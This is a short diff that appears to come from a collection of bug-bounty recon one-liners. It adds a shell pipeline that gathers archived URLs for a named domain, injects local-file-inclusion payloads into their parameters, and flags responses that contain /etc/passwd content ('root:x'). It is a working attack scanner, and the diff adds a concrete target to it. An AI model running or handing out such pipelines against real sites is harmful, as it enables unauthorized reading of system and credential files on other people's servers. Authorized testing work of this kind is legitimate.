@@ -171,6 +171,22 @@ for i in $(cat urls); do headi -url $i;done
 gau HOST | gf lfi | xargs -I% -P 25 sh -c 'while read payload; do url=$(echo "%" | qsreplace "$payload"); response=$(curl -s "$url"); echo "$response" | grep -q "root:x" && echo "VULN! $url"; done < payload.txt'
 ```
 
+```
+waybackurls dllromsd.org | gf lfi | grep "=" | xargs -I% -P 25 sh -c '
+while read payload; do
+    url=$(echo "%" | qsreplace "$payload")
+    response=$(curl -s "$url")
+    if echo "$response" | grep -q "root:x"; then
+        echo "VULN! $url"
+    else
+        echo "NOT VULN $url"
+    fi
+done < payload.txt
+'
+
+
+```
+
 
 
 
